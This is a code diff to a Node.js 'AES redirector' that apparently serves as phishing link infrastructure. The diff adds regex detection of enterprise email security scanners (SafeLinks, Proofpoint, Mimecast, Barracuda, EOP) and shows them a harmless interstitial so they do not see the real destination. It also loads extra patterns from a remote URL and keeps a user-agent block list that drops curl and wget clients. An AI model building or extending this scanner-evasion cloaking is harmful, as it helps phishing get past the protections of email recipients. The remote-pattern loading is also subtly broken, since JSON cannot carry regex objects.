@@ -1,4 +1,4 @@
-// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.3 Beta)
+// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.4 Beta)
 require("dotenv").config();
 const express = require("express");
 const crypto = require("crypto");
@@ -517,7 +517,87 @@ function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
   <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
 </body>`);
 }
-// Known email/link security scanners (NOT general web crawlers)
+
+// ================== ENHANCED SCANNER DETECTION ==================
+// Enhanced scanner detection with patterns and metadata
+const SCANNER_PATTERNS = [
+  {
+    pattern: /safelinks\.protection\.outlook\.com|microsoft.*safelinks/i,
+    name: "Microsoft SafeLinks",
+    confidence: 0.95,
+    type: "enterprise"
+  },
+  {
+    pattern: /proofpoint|ppops-.*-(\d+)/i,
+    name: "Proofpoint TAP",
+    confidence: 0.90,
+    type: "enterprise" 
+  },
+  {
+    pattern: /mimecast|mimecast-control-center/i,
+    name: "Mimecast",
+    confidence: 0.90,
+    type: "enterprise"
+  },
+  {
+    pattern: /barracuda|bemailhec/i,
+    name: "Barracuda",
+    confidence: 0.85,
+    type: "enterprise"
+  },
+  {
+    pattern: /(microsoft-office|outlook).*scan|eop/i,
+    name: "Office 365 EOP",
+    confidence: 0.80,
+    type: "enterprise"
+  },
+  {
+    pattern: /url.*proxy|link.*scan|security.*scan/i,
+    name: "Generic URL Scanner",
+    confidence: 0.70,
+    type: "generic"
+  }
+];
+
+// External configuration support
+const EXTERNAL_SCANNER_CONFIG = process.env.SCANNER_CONFIG_URL || null;
+let dynamicScanners = [];
+
+// Load external scanner definitions
+async function loadScannerPatterns() {
+  if (EXTERNAL_SCANNER_CONFIG) {
+    try {
+      const response = await fetch(EXTERNAL_SCANNER_CONFIG);
+      dynamicScanners = await response.json();
+      addLog(`[SCANNER] Loaded ${dynamicScanners.length} external scanner patterns`);
+    } catch (error) {
+      addLog(`[SCANNER] Failed to load external patterns: ${error.message}`);
+    }
+  }
+}
+
+// Enhanced detection with scoring
+function detectScannerEnhanced(req) {
+  const ua = (req.get("user-agent") || "").toLowerCase();
+  const ip = getClientIp(req);
+  
+  let detected = [];
+  const allPatterns = [...SCANNER_PATTERNS, ...dynamicScanners];
+  
+  for (const scanner of allPatterns) {
+    if (scanner.pattern.test(ua)) {
+      detected.push({
+        ...scanner,
+        matchedString: ua.match(scanner.pattern)[0],
+        ip: ip
+      });
+    }
+  }
+  
+  return detected.sort((a, b) => b.confidence - a.confidence);
+}
+
+// Backward compatibility - keep the old array for reference
 const EMAIL_SCANNER_UAS = [
   "safelinks", "microsoft office", "eop", "defender", "outlook",
   "proofpoint", "mimecast", "barracuda", "url%20proxy", "apwk"
@@ -1102,11 +1182,12 @@ function checkSecurityPolicies(req) {
   }
 
   // Email/security scanners -> Interstitial (early, before any blocks)
-  const uaL = ua.toLowerCase();
-  if (EMAIL_SCANNER_UAS.some(b => uaL.includes(b))) {
-    addLog(`[SCANNER] interstitial ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
-    return { blocked: true, interstitial: true };
-  }
+const scannerDetections = detectScannerEnhanced(req);
+if (scannerDetections.length > 0) {
+  const topDetection = scannerDetections[0];
+  addLog(`[SCANNER] interstitial ip=${ip} scanner="${topDetection.name}" confidence=${topDetection.confidence} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
+  return { blocked: true, interstitial: true, scanner: topDetection.name };
+}
 
   // Quick UA denylist to drop obvious non-browser clients early
   const BAD_UA = /(okhttp|python-requests|curl|wget|phantomjs)/i;
@@ -1552,9 +1633,13 @@ function startupSummary() {
 }
 
 const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
   if (geoip) addLog("ℹ️ geoip-lite enabled as country fallback");
+  
+  // Initialize enhanced scanner detection
+  await loadScannerPatterns();
+  
   addLog(`🚀 Server running on port ${PORT}`);
-  addLog(startupSummary());   // <— write once into LOGS/stdout
+  addLog(startupSummary());
   addSpacer();
 });
